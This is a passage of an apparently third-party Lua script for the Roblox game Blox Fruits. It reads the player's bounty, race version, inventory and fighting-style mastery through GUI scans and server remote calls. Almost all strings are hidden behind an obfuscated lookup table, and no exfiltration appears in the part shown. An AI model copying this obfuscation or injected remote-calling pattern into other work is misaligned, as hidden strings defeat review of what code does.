    [_0x3KG_STR[60]] = _0x3KG_STR[61], [_0x3KG_STR[62]] = _0x3KG_STR[63], [_0x3KG_STR[64]] = _0x3KG_STR[65], [_0x3KG_STR[66]] = _0x3KG_STR[67],
    [_0x3KG_STR[68]] = _0x3KG_STR[69], [_0x3KG_STR[70]] = _0x3KG_STR[71], [_0x3KG_STR[72]] = _0x3KG_STR[73], [_0x3KG_STR[74]] = _0x3KG_STR[75],
    [_0x3KG_STR[76]] = _0x3KG_STR[77], [_0x3KG_STR[78]] = _0x3KG_STR[79], [_0x3KG_STR[80]] = _0x3KG_STR[81], [_0x3KG_STR[82]] = _0x3KG_STR[83],
    [_0x3KG_STR[84]] = _0x3KG_STR[85], [_0x3KG_STR[86]] = _0x3KG_STR[87], [_0x3KG_STR[88]] = _0x3KG_STR[89], [_0x3KG_STR[90]] = _0x3KG_STR[91],
    [_0x3KG_STR[92]] = _0x3KG_STR[93], [_0x3KG_STR[94]] = _0x3KG_STR[95], [_0x3KG_STR[96]] = _0x3KG_STR[97], [_0x3KG_STR[98]] = _0x3KG_STR[99],
    [_0x3KG_STR[100]] = _0x3KG_STR[101], [_0x3KG_STR[102]] = _0x3KG_STR[103], [_0x3KG_STR[104]] = _0x3KG_STR[105], [_0x3KG_STR[106]] = _0x3KG_STR[107],
    [_0x3KG_STR[108]] = _0x3KG_STR[109], [_0x3KG_STR[110]] = _0x3KG_STR[109], [_0x3KG_STR[111]] = _0x3KG_STR[112], [_0x3KG_STR[113]] = _0x3KG_STR[114],
    [_0x3KG_STR[115]] = _0x3KG_STR[116], [_0x3KG_STR[117]] = _0x3KG_STR[118], [_0x3KG_STR[119]] = _0x3KG_STR[120], [_0x3KG_STR[121]] = _0x3KG_STR[122],
    [_0x3KG_STR[123]] = _0x3KG_STR[124], [_0x3KG_STR[125]] = _0x3KG_STR[126], [_0x3KG_STR[127]] = _0x3KG_STR[128], [_0x3KG_STR[129]] = _0x3KG_STR[130],
    [_0x3KG_STR[131]] = _0x3KG_STR[132], [_0x3KG_STR[133]] = _0x3KG_STR[134], [_0x3KG_STR[135]] = _0x3KG_STR[136]
}

local function cleanFruitName(rawName)
    if not rawName then return nil end
    local str = tostring(rawName):lower()
    
    if string.find(str, _0x3KG_STR[137]) or string.find(str, _0x3KG_STR[110]) then
        return _0x3KG_STR[109]
    end
    
    local first = string.split(str, _0x3KG_STR[138])[1]
    first = string.gsub(first, _0x3KG_STR[139], "")
    first = string.gsub(first, _0x3KG_STR[140], "")
    if knownFruitNames[first] then return knownFruitNames[first] end
    
    local part = string.split(first, _0x3KG_STR[141])[1]
    return knownFruitNames[part]
end

-- Helper lấy giá trị an toàn
local function getVal(obj, path, default)
    local current = obj
    for _, name in ipairs(path) do
        if current and current:FindFirstChild(name) then
            current = current[name]
        else
            return default
        end
    end
    if not current then return default end
    
    if current:IsA(_0x3KG_STR[142]) or current:IsA(_0x3KG_STR[143]) then
        for _, childName in ipairs({_0x3KG_STR[144], _0x3KG_STR[145], _0x3KG_STR[146], _0x3KG_STR[147], _0x3KG_STR[148], _0x3KG_STR[149]}) do
            local child = current:FindFirstChild(childName)
            if child then
                local ok, val = pcall(function() return child.Value end)
                if ok and val ~= nil then return val end
            end
        end
        return default
    end
    
    local ok, val = pcall(function() return current.Value end)
    if ok and val ~= nil then return val end
    
    return default
end

-- HELPER PARSE CHUỖI BOUNTY DẠNG _0x3KG_STR[150], _0x3KG_STR[151], _0x3KG_STR[152], _0x3KG_STR[153]
local function parseBountyText(txt)
    if not txt or txt == "" then return nil end
    local clean = string.gsub(tostring(txt), _0x3KG_STR[154], "")
    clean = string.gsub(clean, _0x3KG_STR[155], "")
    clean = string.gsub(clean, _0x3KG_STR[156], _0x3KG_STR[157])
    
    -- Xử lý dạng _0x3KG_STR[150], _0x3KG_STR[151], _0x3KG_STR[158]
    local mVal = string.match(clean, _0x3KG_STR[159])
    if mVal then
        local num = tonumber(mVal)
        if num then return math.floor(num * 1000000) end
    end
    
    -- Xử lý dạng _0x3KG_STR[152], _0x3KG_STR[160]
    local kVal = string.match(clean, _0x3KG_STR[161])
    if kVal then
        local num = tonumber(kVal)
        if num then return math.floor(num * 1000) end
    end
    
    -- Xử lý dạng số thuần
    local rawNum = string.gsub(clean, _0x3KG_STR[162], "")
    local num = tonumber(rawNum)
    if num then return num end
    
    return nil
end

-- ĐỌC CHÍNH XÁC BOUNTY VÀ HONOR CỦA TỪNG TÀI KHOẢN (KHÔNG BỊ NHẦM VỚI TIỀN BELI)
local function getBountyAndHonor()
    local ls = LocalPlayer:FindFirstChild(_0x3KG_STR[40])
    local df = LocalPlayer:FindFirstChild(_0x3KG_STR[39]) or LocalPlayer
    
    local bounty = 0

    -- 1. Ưu tiên số 1: Đọc từ leaderstats (chỉ số chính thức từ Server Blox Fruits cho phe đang chơi)
    if ls then
        local bh = ls:FindFirstChild(_0x3KG_STR[163]) or ls:FindFirstChild(_0x3KG_STR[164])
        if bh and bh:IsA(_0x3KG_STR[165]) and (tonumber(bh.Value) or 0) > 0 then
            bounty = tonumber(bh.Value) or 0
        end
        if bounty == 0 then
            local b = ls:FindFirstChild(_0x3KG_STR[166]) or ls:FindFirstChild(_0x3KG_STR[167])
            if b and b:IsA(_0x3KG_STR[165]) and (tonumber(b.Value) or 0) > 0 then
                bounty = tonumber(b.Value) or 0
            end
        end
        if bounty == 0 then
            local h = ls:FindFirstChild(_0x3KG_STR[168]) or ls:FindFirstChild(_0x3KG_STR[169])
            if h and h:IsA(_0x3KG_STR[165]) and (tonumber(h.Value) or 0) > 0 then
                bounty = tonumber(h.Value) or 0
            end
        end
    end

    -- 2. Ưu tiên số 2: Đọc từ Data folder
    if bounty == 0 and df then
        local b = df:FindFirstChild(_0x3KG_STR[166]) or df:FindFirstChild(_0x3KG_STR[167])
        local h = df:FindFirstChild(_0x3KG_STR[168]) or df:FindFirstChild(_0x3KG_STR[169])
        local bVal = (b and b:IsA(_0x3KG_STR[165])) and tonumber(b.Value) or 0
        local hVal = (h and h:IsA(_0x3KG_STR[165])) and tonumber(h.Value) or 0
        bounty = math.max(bVal, hVal)
    end

    -- 3. Ưu tiên số 3: Soi PlayerGui CHỈ KHI TextLabel chứa hẳn chữ _0x3KG_STR[166] hoặc _0x3KG_STR[168] (Tuyệt đối KHÔNG soi chữ $)
    if bounty == 0 then
        local pg = LocalPlayer:FindFirstChild(_0x3KG_STR[23])
        if pg then
            pcall(function()
                local main = pg:FindFirstChild(_0x3KG_STR[170])
                if main then
                    for _, desc in ipairs(main:GetDescendants()) do
                        if desc:IsA(_0x3KG_STR[31]) and desc.Visible and desc.Text ~= "" then
                            local txt = desc.Text
                            if string.find(txt, _0x3KG_STR[166]) or string.find(txt, _0x3KG_STR[168]) then
                                local parsed = parseBountyText(txt)
                                if parsed and parsed >= 1000 and parsed <= 35000000 then
                                    bounty = parsed
                                    break
                                end
                            end
                        end
                    end
                end
            end)
        end
    end

    return bounty, bounty
end

-- ĐỌC CHÍNH XÁC CHỦNG TỘC (RACE) VÀ CẤP ĐỘ RACE (V1, V2, V3, V4)
local function getRaceAndVersion()
    local df = LocalPlayer:FindFirstChild(_0x3KG_STR[39]) or LocalPlayer
    local raceName = _0x3KG_STR[171]
    local raceFromData = false
    
    -- Exactly as Blox Fruits Stats GUI reads: data:FindFirstChild(_0x3KG_STR[172]) and tostring(data.Race.Value)
    if df and df:FindFirstChild(_0x3KG_STR[172]) then
        pcall(function()
            local rVal = df.Race.Value
            if rVal and tostring(rVal) ~= "" and tostring(rVal) ~= _0x3KG_STR[173] then
                raceName = tostring(rVal)
                raceFromData = true
            end
        end)
    end

    if CommF_ and not raceFromData then
        pcall(function()
            local rName = CommF_:InvokeServer(_0x3KG_STR[174]) or CommF_:InvokeServer(_0x3KG_STR[175])
            if rName and type(rName) == _0x3KG_STR[176] and rName ~= "" and rName ~= _0x3KG_STR[173] then
                raceName = rName
                raceFromData = true
            end
        end)
    end

    local isV2, isV3, isV4 = false, false, false

    -- Direct Data check for Race V4
    if df then
        local rFolder = df:FindFirstChild(_0x3KG_STR[172])
        if rFolder then
            if rFolder:FindFirstChild(_0x3KG_STR[177]) or rFolder:FindFirstChild(_0x3KG_STR[178]) or rFolder:FindFirstChild(_0x3KG_STR[179]) then
                isV4 = true
            end
        end
        if df:FindFirstChild(_0x3KG_STR[180]) or df:FindFirstChild(_0x3KG_STR[181]) or df:FindFirstChild(_0x3KG_STR[182]) then
            isV4 = true
        end
    end

    if string.find(tostring(raceName):upper(), _0x3KG_STR[177]) then
        isV4 = true
    end

    local char = LocalPlayer.Character
    local bp = LocalPlayer:FindFirstChild(_0x3KG_STR[183])
    local pg = LocalPlayer:FindFirstChild(_0x3KG_STR[23])

    local function scanNameForRaceAndVersion(text)
        if not text then return end
        local txt = tostring(text):upper()

        -- Race name & V3 Skill detection (Only override raceName if not already set from Data/Remote)
        if not raceFromData then
            if string.find(txt, _0x3KG_STR[184]) or string.find(txt, _0x3KG_STR[185]) or string.find(txt, _0x3KG_STR[186]) or string.find(txt, _0x3KG_STR[187]) then
                raceName = _0x3KG_STR[188]
            elseif string.find(txt, _0x3KG_STR[189]) or string.find(txt, _0x3KG_STR[190]) or string.find(txt, _0x3KG_STR[191]) then
                raceName = _0x3KG_STR[192]
            elseif string.find(txt, _0x3KG_STR[193]) or string.find(txt, _0x3KG_STR[194]) or string.find(txt, _0x3KG_STR[195]) then
                raceName = _0x3KG_STR[196]
            elseif string.find(txt, _0x3KG_STR[197]) or string.find(txt, _0x3KG_STR[198]) then
                raceName = _0x3KG_STR[199]
            elseif string.find(txt, _0x3KG_STR[200]) or string.find(txt, _0x3KG_STR[201]) then
                raceName = _0x3KG_STR[202]
            elseif string.find(txt, _0x3KG_STR[203]) or string.find(txt, _0x3KG_STR[204]) then
                raceName = _0x3KG_STR[171]
            end
        end

        if string.find(txt, _0x3KG_STR[186]) or string.find(txt, _0x3KG_STR[187])
        or string.find(txt, _0x3KG_STR[191]) or string.find(txt, _0x3KG_STR[195])
        or string.find(txt, _0x3KG_STR[198]) or string.find(txt, _0x3KG_STR[201])
        or string.find(txt, _0x3KG_STR[203]) or string.find(txt, _0x3KG_STR[204]) then
            isV3 = true
        end

        -- Race V4 specific detection
        if string.find(txt, _0x3KG_STR[205]) or string.find(txt, _0x3KG_STR[206]) or string.find(txt, _0x3KG_STR[207]) or string.find(txt, _0x3KG_STR[208]) then
            isV4 = true
        end
    end

    -- 1. Scan Character descendants
    if char then
        for _, child in ipairs(char:GetDescendants()) do
            scanNameForRaceAndVersion(child.Name)
            if child.Name == _0x3KG_STR[180] or child.Name == _0x3KG_STR[209] or child.Name == _0x3KG_STR[210] then
                isV4 = true
            end
        end
    end

    -- 2. Scan Backpack descendants
    if bp then
        for _, child in ipairs(bp:GetDescendants()) do
            scanNameForRaceAndVersion(child.Name)
        end
    end

    -- 3. Scan PlayerGui move labels
    if pg then
        pcall(function()
            local main = pg:FindFirstChild(_0x3KG_STR[170])
            if main then
                if main:FindFirstChild(_0x3KG_STR[211]) or main:FindFirstChild(_0x3KG_STR[210]) or main:FindFirstChild(_0x3KG_STR[212]) then
                    isV4 = true
                end
                for _, desc in ipairs(main:GetDescendants()) do
                    if desc:IsA(_0x3KG_STR[31]) and desc.Visible and desc.Text ~= "" then
                        scanNameForRaceAndVersion(desc.Text)
                        local txtUpper = desc.Text:upper()
                        if string.find(txtUpper, _0x3KG_STR[205]) or string.find(txtUpper, _0x3KG_STR[206]) then
                            isV4 = true
                        elseif string.find(txtUpper, _0x3KG_STR[213]) or string.find(txtUpper, _0x3KG_STR[214]) then
                            if not isV4 then isV3 = true end
                        elseif string.find(txtUpper, _0x3KG_STR[215]) or string.find(txtUpper, _0x3KG_STR[216]) then
                            if not isV3 and not isV4 then isV2 = true end
                        end
                    end
                end
            end
        end)
    end

    if isV4 then
        isV3 = true
        isV2 = true
    elseif isV3 then
        isV2 = true
    end

    local raceV4Tier = 0
    if df and df:FindFirstChild(_0x3KG_STR[172]) and df.Race:FindFirstChild(_0x3KG_STR[217]) then
        pcall(function()
            local cVal = tonumber(df.Race.C.Value)
            if cVal and cVal > 0 then
                raceV4Tier = cVal
                isV4 = true
            end
        end)
    end

    -- Direct Blox Fruits Remote Queries for Race & Race Level
    if CommF_ then
        pcall(function()
            local rLvl = CommF_:InvokeServer(_0x3KG_STR[218])
            if rLvl ~= nil then
                local numLvl = tonumber(rLvl)
                if numLvl then
                    if numLvl >= 3 then isV3 = true; isV2 = true
                    elseif numLvl >= 2 then isV2 = true end
                elseif type(rLvl) == _0x3KG_STR[176] then
                    local strLvl = rLvl:upper()
                    if string.find(strLvl, _0x3KG_STR[219]) or string.find(strLvl, _0x3KG_STR[220]) then isV3 = true; isV2 = true
                    elseif string.find(strLvl, _0x3KG_STR[221]) or string.find(strLvl, _0x3KG_STR[222]) then isV2 = true end
                end
            end
        end)
    end

    -- Normalize race names
    if raceName:lower() == _0x3KG_STR[223] then raceName = _0x3KG_STR[188] end
    if raceName:lower() == _0x3KG_STR[224] or raceName:lower() == _0x3KG_STR[225] then raceName = _0x3KG_STR[196] end
    if raceName:lower() == _0x3KG_STR[226] then raceName = _0x3KG_STR[192] end

    -- Check Data folder flags
    if df then
        local function checkBool(names)
            for _, n in ipairs(names) do
                local v = df:FindFirstChild(n)
                if v then
                    local isTrue = false
                    pcall(function()
                        if v.Value == true or v.Value == 1 or tostring(v.Value) == _0x3KG_STR[227] then
                            isTrue = true
                        end
                    end)
                    if isTrue then return true end
                end
            end
            return false
        end

        if checkBool({_0x3KG_STR[180], _0x3KG_STR[228], _0x3KG_STR[177], _0x3KG_STR[229], _0x3KG_STR[230]}) then isV4 = true end
        if checkBool({_0x3KG_STR[231], _0x3KG_STR[232], _0x3KG_STR[219], _0x3KG_STR[233]}) then isV3 = true end
        if checkBool({_0x3KG_STR[234], _0x3KG_STR[235], _0x3KG_STR[221], _0x3KG_STR[236]}) then isV2 = true end

        local verVal = df:FindFirstChild(_0x3KG_STR[237]) or df:FindFirstChild(_0x3KG_STR[238])
        if verVal then
            pcall(function()
                local verNum = tonumber(verVal.Value) or 1
                if verNum >= 4 then isV4 = true end
                if verNum >= 3 then isV3 = true end
                if verNum >= 2 then isV2 = true end
            end)
        end
    end

    raceName = string.gsub(raceName, _0x3KG_STR[239], "")
    if raceName == "" or raceName == _0x3KG_STR[173] then raceName = _0x3KG_STR[171] end

    -- Chaining logic
    if isV4 then isV3 = true; isV2 = true end
    if isV3 then isV2 = true end

    return raceName, isV2, isV3, isV4, raceV4Tier
end

-- ĐỌC CHÍNH XÁC ĐÒN BẨY V4 (PULL LEVER / TEMPLE OF TIME LEVER)
local function checkPullLever(isV4)
    if isV4 == true then return true end

    if CommF_ then
        local ok, res = pcall(function()
            return CommF_:InvokeServer(_0x3KG_STR[240])
        end)
        if ok and (res == true or res == 1 or res == _0x3KG_STR[227]) then
            return true
        end
    end

    local df = LocalPlayer:FindFirstChild(_0x3KG_STR[39])
    if df then
        for _, name in ipairs({_0x3KG_STR[241], _0x3KG_STR[242], _0x3KG_STR[243], _0x3KG_STR[244], _0x3KG_STR[245]}) do
            local val = df:FindFirstChild(name)
            if val and (val.Value == true or val.Value == 1 or val.Value == _0x3KG_STR[227]) then
                return true
            end
        end
    end

    local attr = LocalPlayer:GetAttribute(_0x3KG_STR[242]) or LocalPlayer:GetAttribute(_0x3KG_STR[241]) or LocalPlayer:GetAttribute(_0x3KG_STR[243])
    if attr == true or attr == 1 then
        return true
    end

    if CommF_ then
        local remoteChecks = {
            {_0x3KG_STR[246]},
            {_0x3KG_STR[247]},
            {_0x3KG_STR[248]},
            {_0x3KG_STR[249], _0x3KG_STR[246]},
            {_0x3KG_STR[249], _0x3KG_STR[247]}
        }

        for _, args in ipairs(remoteChecks) do
            local ok, res = pcall(function()
                return CommF_:InvokeServer(unpack(args))
            end)
            if ok and res ~= nil then
                if res == true or res == 1 or res == _0x3KG_STR[250] or res == _0x3KG_STR[251] or (type(res) == _0x3KG_STR[4] and (res.Lever == true or res.Pulled == true)) then
                    return true
                end
            end
        end
    end

    return false
end

-- 4. ĐỌC CHÍNH XÁC RƯƠNG TRÁI ÁC QUỶ & VẬT PHẨM (TREASURE & INVENTORY WEAPONS)
local function getInventoryItems(equippedStyle, equippedSword, isV4)
    local inv = {}
    local ownedMap = {}

    if equippedSword and equippedSword ~= _0x3KG_STR[173] then
        ownedMap[equippedSword] = 1
    end
    if equippedStyle and equippedStyle ~= _0x3KG_STR[173] and equippedStyle ~= _0x3KG_STR[252] then
        ownedMap[equippedStyle] = 1
    end

    -- Check Lever Pulled status for V4 awakening
    if checkPullLever(isV4) then
        ownedMap[_0x3KG_STR[253]] = 1
        ownedMap[_0x3KG_STR[254]] = 1
    end

    -- Scan Backpack and Character tools & accessories
    local containers = { LocalPlayer.Character, LocalPlayer:FindFirstChild(_0x3KG_STR[183]) }
    for _, c in ipairs(containers) do
        if c then
            for _, t in ipairs(c:GetDescendants()) do
                if (t:IsA(_0x3KG_STR[255]) or t:IsA(_0x3KG_STR[256])) and t.Name ~= "" then
                    ownedMap[t.Name] = 1
                    local tLower = t.Name:lower()
                    if string.find(tLower, _0x3KG_STR[257]) then ownedMap[_0x3KG_STR[258]] = 1; ownedMap[_0x3KG_STR[259]] = 1 end
                    if string.find(tLower, _0x3KG_STR[260]) then ownedMap[_0x3KG_STR[261]] = 1; ownedMap[_0x3KG_STR[262]] = 1 end
                    if string.find(tLower, _0x3KG_STR[263]) then ownedMap[_0x3KG_STR[264]] = 1 end
                end
            end
        end
    end

    -- Query ALL Blox Fruits Inventory Remotes (getInventory, getInventoryWeapons, getInventoryMaterials)
    if CommF_ then
        local invRemotes = { _0x3KG_STR[265], _0x3KG_STR[266], _0x3KG_STR[267], _0x3KG_STR[268] }
        for _, rName in ipairs(invRemotes) do
            pcall(function()
                local res = CommF_:InvokeServer(rName)
                if type(res) == _0x3KG_STR[4] then
                    for _, item in ipairs(res) do
                        local name = item.Name or item.name or item.Id or item.id
                        if name then
                            local count = tonumber(item.Count or item.count or item.Value or item.value) or 1
                            ownedMap[tostring(name)] = count
                            
                            local nLower = tostring(name):lower()
                            if string.find(nLower, _0x3KG_STR[257]) then
                                ownedMap[_0x3KG_STR[258]] = count
                                ownedMap[_0x3KG_STR[259]] = count
                            end
                            if string.find(nLower, _0x3KG_STR[260]) then
                                ownedMap[_0x3KG_STR[261]] = count
                                ownedMap[_0x3KG_STR[262]] = count
                            end
                            if string.find(nLower, _0x3KG_STR[263]) then
                                ownedMap[_0x3KG_STR[264]] = count
                            end
                        end
                    end
                end
            end)
        end
    end

    for name, count in pairs(ownedMap) do
        table.insert(inv, { name = name, count = count })
    end

    return inv
end

-- ĐỌC CHÍNH XÁC TRÁI ÁC QUỶ ĐANG ĂN / SỬ DỤNG
local function getEquippedFruit()
    local df = LocalPlayer:FindFirstChild(_0x3KG_STR[39]) or LocalPlayer
    local dfFruit = getVal(df, {_0x3KG_STR[269]}, nil) or getVal(df, {_0x3KG_STR[270]}, nil)
    if dfFruit and tostring(dfFruit) ~= "" and tostring(dfFruit) ~= _0x3KG_STR[173] then
        local c = cleanFruitName(dfFruit)
        if c then return c end
        return tostring(dfFruit)
    end

    local char = LocalPlayer.Character
    local bp = LocalPlayer:FindFirstChild(_0x3KG_STR[183])
    
    local function checkFruitTool(container)
        if not container then return nil end
        for _, tool in ipairs(container:GetChildren()) do
            if tool:IsA(_0x3KG_STR[255]) and (tool.ToolTip == _0x3KG_STR[271] or string.find(tool.Name, _0x3KG_STR[270])) then
                local name = tool.Name:match(_0x3KG_STR[272]) or tool.Name
                name = name:match(_0x3KG_STR[273]) or name
                local c = cleanFruitName(name)
                if c then return c end
                return name
            end
        end
        return nil
    end

    local f = checkFruitTool(char) or checkFruitTool(bp)
    if f and f ~= "" then return f end

    return getVal(df, {_0x3KG_STR[270]}, _0x3KG_STR[173])
end

-- 1. ĐỌC CHÍNH XÁC VÕ ĐANG SỬ DỤNG (EQUIPPED FIGHTING STYLE CHO BẢNG BÊN DƯỚI)
local function getEquippedMelee()
    local char = LocalPlayer.Character
    local bp = LocalPlayer:FindFirstChild(_0x3KG_STR[183])
    
    local function searchMeleeTool(container)
        if not container then return nil end
        for _, tool in ipairs(container:GetChildren()) do
            if tool:IsA(_0x3KG_STR[255]) then
                local tName = tool.Name
                if string.find(tName, _0x3KG_STR[274]) then return _0x3KG_STR[275] end
                if string.find(tName, _0x3KG_STR[276]) then return _0x3KG_STR[276] end
                if string.find(tName, _0x3KG_STR[277]) then return _0x3KG_STR[277] end
                if string.find(tName, _0x3KG_STR[278]) then return _0x3KG_STR[278] end
                if string.find(tName, _0x3KG_STR[279]) or string.find(tName, _0x3KG_STR[280]) then return _0x3KG_STR[281] end
                if string.find(tName, _0x3KG_STR[282]) then return _0x3KG_STR[282] end
                if string.find(tName, _0x3KG_STR[283]) then return _0x3KG_STR[283] end
                if string.find(tName, _0x3KG_STR[284]) then return _0x3KG_STR[284] end
                if string.find(tName, _0x3KG_STR[285]) then return _0x3KG_STR[286] end
                if string.find(tName, _0x3KG_STR[287]) then return _0x3KG_STR[287] end
                if string.find(tName, _0x3KG_STR[288]) or string.find(tName, _0x3KG_STR[289]) then return _0x3KG_STR[288] end
                if tool.ToolTip == _0x3KG_STR[290] then return tName end
            end
        end
        return nil
    end

    local equippedMelee = searchMeleeTool(char) or searchMeleeTool(bp)
    if equippedMelee and equippedMelee ~= "" then
        return equippedMelee
    end

    local pg = LocalPlayer:FindFirstChild(_0x3KG_STR[23])
    if pg then
        local main = pg:FindFirstChild(_0x3KG_STR[170])
        if main then
            for _, desc in ipairs(main:GetDescendants()) do
                if desc:IsA(_0x3KG_STR[31]) and desc.Visible and desc.Text ~= "" then
                    local txt = desc.Text:upper()
                    if string.find(txt, _0x3KG_STR[291]) then return _0x3KG_STR[275] end
                    if string.find(txt, _0x3KG_STR[292]) then return _0x3KG_STR[276] end
                    if string.find(txt, _0x3KG_STR[293]) then return _0x3KG_STR[277] end
                    if string.find(txt, _0x3KG_STR[294]) then return _0x3KG_STR[278] end
                    if string.find(txt, _0x3KG_STR[295]) or string.find(txt, _0x3KG_STR[296]) then return _0x3KG_STR[281] end
                    if string.find(txt, _0x3KG_STR[297]) then return _0x3KG_STR[282] end
                    if string.find(txt, _0x3KG_STR[298]) then return _0x3KG_STR[283] end
                end
            end
        end
    end

    local dataMelee = getVal(dataFolder, {_0x3KG_STR[299]}, nil)
    if dataMelee and dataMelee ~= "" then return dataMelee end

    return _0x3KG_STR[252]
end

local MeleeAliasMap = {
	[_0x3KG_STR[252]]          = {_0x3KG_STR[252]},
	[_0x3KG_STR[288]]       = {_0x3KG_STR[288], _0x3KG_STR[289]},
	[_0x3KG_STR[287]]         = {_0x3KG_STR[300], _0x3KG_STR[287]},
	[_0x3KG_STR[286]]  = {_0x3KG_STR[301], _0x3KG_STR[286]},
	[_0x3KG_STR[284]]     = {_0x3KG_STR[302], _0x3KG_STR[284]},
	[_0x3KG_STR[283]]      = {_0x3KG_STR[283]},
	[_0x3KG_STR[282]]      = {_0x3KG_STR[282]},
	[_0x3KG_STR[281]] = {_0x3KG_STR[281]},
	[_0x3KG_STR[278]]   = {_0x3KG_STR[278]},
	[_0x3KG_STR[277]]    = {_0x3KG_STR[277]},
	[_0x3KG_STR[276]]        = {_0x3KG_STR[276]},
	[_0x3KG_STR[275]]    = {_0x3KG_STR[275]}
}

local MasterFightingStyles = {
	[15] = _0x3KG_STR[275],
	[22] = _0x3KG_STR[252],
	[33] = _0x3KG_STR[288],
	[34] = _0x3KG_STR[288],
	[45] = _0x3KG_STR[287],
	[55] = _0x3KG_STR[286],
	[68] = _0x3KG_STR[284],
	[88] = _0x3KG_STR[283],
	[111] = _0x3KG_STR[282],
	[122] = _0x3KG_STR[281],
	[126] = _0x3KG_STR[278],
	[1108] = _0x3KG_STR[275],
	[1113] = _0x3KG_STR[252],
	[1119] = _0x3KG_STR[288],
	[1129] = _0x3KG_STR[287],
	[1134] = _0x3KG_STR[286],
	[1144] = _0x3KG_STR[284],
	[1162] = _0x3KG_STR[283],
	[1184] = _0x3KG_STR[282],
	[1456] = _0x3KG_STR[288]
}

-- 2. ĐỌC DANH SÁCH TẤT CẢ CÁC VÕ ĐÃ SỞ HỮU KÈM THEO MASTERY
local function getOwnedMelees(equippedStyle)
	local ownedMelees = {}
	local meleeMasteries = {}

	if equippedStyle and equippedStyle ~= _0x3KG_STR[252] and equippedStyle ~= _0x3KG_STR[173] then
		ownedMelees[equippedStyle] = true
	end

	-- 1. Lấy dữ liệu lưu trữ từ Server qua Remote RF/GetAllItemValues
	pcall(function()
		local Net = ReplicatedStorage:FindFirstChild(_0x3KG_STR[303]) and ReplicatedStorage.Modules:FindFirstChild(_0x3KG_STR[304])
		local GetAllItemValues = Net and Net:FindFirstChild(_0x3KG_STR[305])

		if GetAllItemValues then
			local ok, playerValues = pcall(function() return GetAllItemValues:InvokeServer() end)
			if ok and type(playerValues) == _0x3KG_STR[4] then
				for _, entry in ipairs(playerValues) do
					local styleName = MasterFightingStyles[entry.ItemId]
					if not styleName and entry.ItemId then
						pcall(function()
							local ItemConfig = require(ReplicatedStorage.ItemConfig)
							local label = ItemConfig.match(entry.ItemId):unwrap().Index.DebugLabel
							if label then
								local clean = label:match(_0x3KG_STR[272]) or label
								for canon, aliases in pairs(MeleeAliasMap) do
									for _, alias in ipairs(aliases) do
										if clean == alias or clean:lower() == alias:lower() then
											styleName = canon
											break
										end
									end
									if styleName then break end
								end
							end
						end)
					end

					if styleName then
						if entry.Key == _0x3KG_STR[306] and entry.Value == true then
							ownedMelees[styleName] = true
							if not meleeMasteries[styleName] then
								meleeMasteries[styleName] = 1
							end
						elseif entry.Key == _0x3KG_STR[147] and type(entry.Value) == _0x3KG_STR[307] then
							if not meleeMasteries[styleName] or entry.Value > meleeMasteries[styleName] then
								meleeMasteries[styleName] = entry.Value
							end
						end
					end
				end
			end
		end
	end)

	-- 2. Quét bổ sung từ Backpack và Character nếu đang trang bị
	local function scanContainer(container)
		if container then
			for _, item in ipairs(container:GetChildren()) do
				if item:IsA(_0x3KG_STR[255]) then
					local masObj = item:FindFirstChild(_0x3KG_STR[144]) or item:FindFirstChild(_0x3KG_STR[147])
					local masVal = (masObj and type(masObj.Value) == _0x3KG_STR[307]) and masObj.Value or 1

					for canonName, aliases in pairs(MeleeAliasMap) do
						for _, alias in ipairs(aliases) do
							if item.Name == alias or item.Name:lower() == alias:lower() then
								ownedMelees[canonName] = true
								if not meleeMasteries[canonName] or masVal > meleeMasteries[canonName] then
									meleeMasteries[canonName] = masVal
								end
							end
						end
					end
				end
			end
		end
	end

	scanContainer(LocalPlayer:FindFirstChild(_0x3KG_STR[183]))
	scanContainer(LocalPlayer.Character)

	-- 3. Kiểm tra bổ sung trực tiếp từ Server Remotes nếu chưa được phát hiện
	if CommF_ then
		local meleeCheckRemotes = {
			[_0x3KG_STR[275]]    = function() return CommF_:InvokeServer(_0x3KG_STR[308], true) == 1 end,
			[_0x3KG_STR[277]]    = function() return CommF_:InvokeServer(_0x3KG_STR[309], true) == 1 end,
			[_0x3KG_STR[276]]        = function() return CommF_:InvokeServer(_0x3KG_STR[310], true) == 1 end,
			[_0x3KG_STR[278]]   = function() return CommF_:InvokeServer(_0x3KG_STR[311], true) == 1 end,
			[_0x3KG_STR[281]] = function() return CommF_:InvokeServer(_0x3KG_STR[312], true) == 1 end,
			[_0x3KG_STR[282]]      = function() return CommF_:InvokeServer(_0x3KG_STR[313], true) == 1 end,
			[_0x3KG_STR[283]]      = function() return CommF_:InvokeServer(_0x3KG_STR[314], true) == 1 end,
			[_0x3KG_STR[284]]     = function() return CommF_:InvokeServer(_0x3KG_STR[315], _0x3KG_STR[316], _0x3KG_STR[317]) == 1 end,
			[_0x3KG_STR[286]]  = function() return CommF_:InvokeServer(_0x3KG_STR[318], true) == 1 end,
			[_0x3KG_STR[287]]         = function() return CommF_:InvokeServer(_0x3KG_STR[319], true) == 1 end,
			[_0x3KG_STR[288]]       = function() return CommF_:InvokeServer(_0x3KG_STR[320], true) == 1 end,
		}

		for mName, checkFn in pairs(meleeCheckRemotes) do
			if not ownedMelees[mName] then
				local ok, isOwned = pcall(checkFn)
				if ok and isOwned then
					ownedMelees[mName] = true
					if not meleeMasteries[mName] then
						meleeMasteries[mName] = 1
					end
				end
			end
		end
	end

	local result = {}
	for name, isOwned in pairs(ownedMelees) do
		if isOwned then
			table.insert(result, { name = name, count = 1, mastery = meleeMasteries[name] or 1 })
		end
	end

	return result
end

-- 3. ĐỌC CHÍNH XÁC ĐIỂM MASTERY CỦA VÕ & KIẾM
local function getToolMastery(toolType)
    local char = LocalPlayer.Character
    local bp = LocalPlayer:FindFirstChild(_0x3KG_STR[183])
    
    local function searchContainer(container)
        if not container then return nil end
        for _, tool in ipairs(container:GetChildren()) do
            if tool:IsA(_0x3KG_STR[255]) then
                local isMatch = (toolType == _0x3KG_STR[290] and (tool.ToolTip == _0x3KG_STR[290] or string.find(tool.Name, _0x3KG_STR[321]) or string.find(tool.Name, _0x3KG_STR[322]) or string.find(tool.Name, _0x3KG_STR[323]) or string.find(tool.Name, _0x3KG_STR[276]) or string.find(tool.Name, _0x3KG_STR[324]) or string.find(tool.Name, _0x3KG_STR[274])))
                             or (toolType == _0x3KG_STR[325] and (tool.ToolTip == _0x3KG_STR[325] or string.find(tool.Name, _0x3KG_STR[326]) or string.find(tool.Name, _0x3KG_STR[49]) or string.find(tool.Name, _0x3KG_STR[327]) or string.find(tool.Name, _0x3KG_STR[328])))
                
                if isMatch then
